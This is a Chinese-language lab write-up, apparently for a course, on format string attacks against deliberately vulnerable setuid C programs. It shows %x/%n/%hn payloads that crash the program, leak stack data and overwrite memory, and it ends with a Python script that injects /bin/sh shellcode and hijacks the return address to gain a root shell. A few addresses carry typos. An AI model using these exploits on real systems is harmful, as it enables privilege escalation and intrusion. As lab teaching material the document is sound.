## 1. 攻击一至四

### 1.1 漏洞程序和实验准备

准备如下实验程序：

```c
// vul.c

#include <stdio.h>

void fmtstr() {
	char input[100];
	int var = 0x11223344;

	// print out info for experiment purpose
	printf("Target address: %x\n", (unsigned) &var);
	printf("Data at target address: 0x%x\n", var);

	printf("Please enter a string: ");
	fgets(input, sizeof(input) - 1, stdin);

	printf(input);
	
	printf("Data at target address: 0x%x\n", var);
}

void main() {
	fmtstr();
}
```

编译程序并更改为setuid程序：

```bash
gcc -m32 -o vul_32 vul.c
sudo chown root vul_32
sudo chmod 4755 vul_32
# 关闭地址随机化
sudo sysctl -w kernel.randomize_va_space=0
```

### 1.2 攻击一：使程序崩溃

输入若干个`%s`即可使得32位程序崩溃，此时由于用户未在`input`中指定其余可变参数，因此`va_list`将会指向`input`参数指针上方的栈空间，printf识别`%s`类型然后尝试对栈空间的地址进行字符串指针类型的解引用。由于它们往往指向非法地址，因此会使得程序出现`segmentation fault`并崩溃退出。

对于64位程序，前6个参数通过寄存器传递（如rdi, rsi, rdx等），多余的参数通过栈传递。但若格式字符串中占位符超过寄存器数量，仍需从栈中读取。所以指定一定数量的`%s`也可使得程序崩溃。

### 1.3 攻击二：打印栈上数据

输入`%x`即可以十六进制打印栈上数据（%d，%c也可分别打印对应类型的栈上数据）。此时你也可以看到，`%x`所打印的十六进制数据，就是你通过`%s`尝试解引用的指针地址。

比如在我的环境中，第一个`%x`打印出来的数据是0x63，那么对这个地址进行字符串类型的指针解引用大概率是非法的，所以通过一个`%s`就可以使得程序崩溃了。

输入`%x.%x.%x.%x.%x`可以发现，第5个`%x`打印出来了var的内容`11223344`。

### 1.4 攻击三：修改内存中的程序数据

首先，根据运行`./vul_32`程序打印的值，可知变量var的地址，我的机器上为`0xfffffd1c4`。

由于vul_32的栈空间如下：

```bash
Higher Address
+---------------------------------------+ 
| Previous Stack Frame (e.g., main)     |
+---------------------------------------+ 
| Return Address for `printf` Call      |  ←  Return to `fmtstr` after `printf(input)`
+---------------------------------------+ 
| Saved EBP                             |  ←  Current EBP (Stack Base Pointer)
+---------------------------------------+ 
| Locals of `fmtstr` Function:          |
|   - input[100] (char array)           |  ←  Buffer storing user input (address = 0xffffd0a0)
|     +---------------------------------+    (e.g., user input is stored from input[0] to input[99])
|     | ...                             |  ←  Remaining format string (".%x.%x.%x.%x.%x.%n")
|     | input[5]   = '%'                |  
|     | input[4]   = '.'                |  ←  First '.' in the input string "����.%x.%x.%x.%x.%x.%n"
|     | input[0-3] = 0xffffd1c4         |  ←  User's input: 4 bytes of `var`'s address (0xffffd1c4)
|     +---------------------------------+
|   - var (int) = 0x11223344            |  ←  Address of `var` = 0xffffd1c4 (below `input`)
+---------------------------------------+ 
| Arguments for `printf` Call:          |  ←  **Parameter Area**
|   - Implicit "Arguments"              |  ←  We do not know how many arguments here before reaching var
|   - Format String Pointer (input)     |  ←  Address of `input` (0xffffd0a0) = 1st argument
|     +---------------------------------+
Lower Address
```

我们需要知道要用多少个`%x`来消耗栈上的数据才能够让va_list指向我们的input内容。已知var的地址和input[0]地址相邻，又再Attack 2中我们发现了5个`%s`刚好打印出var的内容。因此我们在`input`开头写入&var地址，然后通过第6个`%n`参数就可以实现将对var内容的修改了。

```bash
# 根据如下命令生成输入程序的字符串：
echo $(printf "\xc4\xd1\xff\xff").%x.%x.%x.%x.%x.%n > input
# 执行程序：
./vul_32 < input
# 变量var处的值改变
...
...
Data at target address: 0x25 # 不同机器可能数值不同
```

**举一反三：**

既然理解了input和var在栈空间的关系，以及printf读取栈上数据的逻辑和顺序，那么攻击载荷还可以作出如下的变通：

```bash
# 多指定四个字节的任意内容插入input头部，然后多用一个%x来消耗之
echo $(printf "\x11\x11\x11\x11\xc4\xd1\xff\xff").%x.%x.%x.%x.%x.%x.%n > input

# 使用不同的%?来消耗栈空间数据，注意不论是用%x，%c还是%d，都是一次读取4字节（32位下），所以仍然需要5个%?
echo $(printf "\xc4\xd1\xff\xff").%c.%d.%c.%x.%c.%n > input

# 以上两种方式写入&var的内容都不一样，因为%n前面打印的长度都不一样
```

### 1.5 攻击四：修改内存中的程序数据为定值

该实验通过控制输出精度来写入定值。

```bash
# 包含4 + (1+8)*4 + (1+10 000 000) = 0x9896a9个字符
echo $(printf "\xc4\xd1\xff\xff")_%.8x_%.8x_%.8x_%.8x_%.10000000x%n > input
# 执行程序
./vul_32 < input
# 可观察到变量值的改变
Data at target address: 0x9896a9
```

### 1.6 攻击四（续）：更快的方法

该实验将var值改成0x66887799，变量var的地址为0xfffffd1c4。如果使用%hn写两次，因为写入值和打印字符的长度相关，而打印字符长度只会越来越长，故则先写入小的值0x6688，再写入0x7799。在小端字节序下，0X6688应写入高地址0xfffffd1c6，0x7799应写入低地址0xfffffd1c4。

```bash
# 为了简便计算，这里的攻击载荷就不像PPT中在每个%之间加一个_作为分隔符了
# 在第一个%hn处写入0x6688，即26248个字符。26248 - 4*3 - 8*4 = 26204，故
# 设置第一个%hn为%26204hn。同理可得第二个%hn精度为0x7799 - 0x6688 = 0x1111 = 4369。
echo $(printf "\xc6\xd1\xff\xff@@@@\xc4\xd1\xff\xff")%.8x%.8x%.8x%.8x%.26204x%hn%.4369x%hn > input
# 执行程序
./vul_32 < input
# 可观察到变量值的改变
Data at target address: 0x66887799
```

## 2. 攻击五：注入恶意代码

首先准备漏洞程序：

```c
// fmtvul.c

#include "stdio.h"

void fmtstr(char *str) {
	unsigned int *framep;
	unsigned int *ret;

	// copy ebp into framep
	asm("movl %%ebp, %0" : "=r" (framep));
	ret = framep + 1;

	printf("address of input array: 0x%.8x\n", (unsigned)str);
	printf("value of the frame pointer: 0x%.8x\n", (unsigned)framep);
	printf("value of the return address: 0x%.8x\n", (unsigned)*ret);

	printf(str);
}

int main(int argc, char **argv) {
	FILE *badfile;
	char str[200];

	badfile = fopen("badfile", "rb");
	fread(str, sizeof(char), 200, badfile);
	fmtstr(str);

	return 1;
}
```

编译漏洞程序的命令如下：

```bash
gcc -m32 -z execstack -o fmtvul_32 fmtvul.c
sudo chown root fmtvul_32
sudo chmod 4755 fmtvul_32
touch badfile
```

通过运行程序可知变量str的起始地址（我的机器为0xffffd164），可知main调用fmtstr时push到栈中的函数返回地址（frame pointer值加上4个字节，我的机器为0xffffd13c）。**假设我们将shellcode写入距离str偏移0x90的位置，即写入0xbfffd1f4。那么，我们就需要将shellcode的地址0xffffd1f4填充到返回地址0xffffd13c处，按照上一个实验%hn的填充方法，即需要先将0xd1f4写入到0xffffd13c，再将0xffff写入0xffffd13e（注意，先写较小的那个数，再写较大的那个数，因为已经打印的字符数量是单调递增的）。**

相应的脚本如下：

```python
#!/usr/bin/python3

import sys

shellcode = (
	"\x31\xc0\x31\xdb\xb0\xd5\xcd\x80"
	"\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50"
	"\x53\x89\xe1\x99\xb0\x0b\xcd\x80\x00"
).encode('latin-1')

N = 200

content = bytearray(0x90 for i in range(N))
start = N - len(shellcode)
content[start:] = shellcode

addr1 = 0xffffd13c	
addr2 = 0xffffd13e
content[0:4] = (addr1).to_bytes(4, byteorder='little')
content[4:8] = ("@@@@").encode('latin-1')
content[8:12] = (addr2).to_bytes(4, byteorder='little')

small = 0xd1f4 - 12 - 19*8
large = 0xffff - 0xd1f4
s = "%.8x"*19 + "%." + str(small) + "x%hn%." + str(large) + "x%hn"
fmt = (s).encode('latin-1')
content[12:12+len(fmt)] = fmt

with open('badfile', 'wb') as wb:
	wb.write(content)
```

其中，如下行需要根据你自己的机器进行填写：

```python
...
addr1 = 0xffffd13c	# 用于存放较小的0xd1f4的地址
addr2 = 0xffffd13e
...
small = 0xd1f4 - 12 - 19*8	# 小数减去前置 addr1@@@@addr2 所占的12字节，再减去19*8字节
large = 0xffff - 0xd1f4		# 大数减小数
s = "%.8x"*19 + "%." + str(small) + "x%hn%." + str(large) + "x%hn"
...
```

执行上述程序后，生成badfile，再执行fmtvul_32，可获得shell。

**思考：为什么写入small之前要用19个%.8x？应该如何确认有多少个栈上数据？（gdb调试？遍历猜测？And so on）**
